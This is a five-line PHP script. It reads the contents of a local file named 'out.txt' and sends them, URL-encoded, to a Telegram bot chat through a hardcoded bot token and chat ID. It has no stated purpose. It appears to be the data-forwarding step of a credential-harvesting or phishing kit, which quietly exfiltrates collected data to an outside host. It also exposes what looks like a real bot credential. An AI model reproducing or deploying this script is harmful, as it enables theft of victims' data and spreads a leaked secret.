<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1164993138:AAFI6y7ypfv04xckiesS6maj-QnaBSlGoq4/sendMessage?chat_id=773614503&text=$msg");
?>
